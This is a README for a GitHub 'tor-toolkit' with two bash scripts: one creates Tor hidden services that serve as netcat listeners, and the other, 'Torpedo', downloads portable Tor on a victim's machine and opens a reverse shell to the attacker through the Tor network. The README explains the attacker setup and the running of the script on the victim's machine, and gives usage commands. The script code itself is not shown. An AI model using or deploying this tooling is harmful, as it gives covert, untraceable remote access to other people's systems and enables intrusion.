# tor-toolkit
This tools are made by me for academic use. Use, modify, do whatever you want.

# Torhost.sh
Is an easy way to create and manage ephemeral hidden services for do whatever u want to do. It's mainly thinked for listener purposes but you know.
By default it uses port 80. Can be upgraded to establish TLS conecction but is not my priority right now. Tested on Debian based systems (Kali, Debian, Parrot) but might work in systemd based systems.

### Options
- install - Torhost will check if u have an hidden service set up on /etc/tor/torrc, if not, it will set up for you.
- start - Start your hidden service.
- stop - Stop your hidden service.
- change - Change hidden service hostname's and print the new one.
- check - Check the hostname of your hidden service.
- listen - Bind hidden service port to netcat local port.

#### Usage/Examples

```bash
sudo bash torhost.sh install
sudo bash torhost.sh check
```
![image](https://github.com/el10tt/tor-toolkit/assets/124470922/ce12a1b3-9db2-4fab-b0ed-84d5b02abd27)


# Torpedo.sh
Is an easy way to launch reverse shells over Tor, just download tor portable version, execute its, and trhow reverse shell trough tor proxy.
It can be executed without root privileges, Its a nice one since there aren't so much reverse shells over Tor on the Internet.

#### Usage/Examples

First of all you need a hidden service (in attacker machine) to receive the reverse shell, you can manage this hidden service with torhost.sh.
You need to bind the hidden service with the listener local port, you can do it with torhost.sh aswell.
When you got listener ready, just execute torpedo.sh in victim's machine, and just wait for your shell.
You can hardcode hidden service parameters in the script body or you can enter'them as parameter.
Torpedo is only tested on x64 debian based systems. To work in i386 you gonna need to change the URL tor package parameter, for the i386 package.

```bash
. bash torpedo.sh
. bash torpedo.sh onionhiddenservice.onion 80
```

![263494593-c47e5b87-9fd4-4363-b2de-78681d264160](https://github.com/el10tt/tor-toolkit/assets/124470922/dbae8b98-34bd-4582-98de-78db3751c15d)
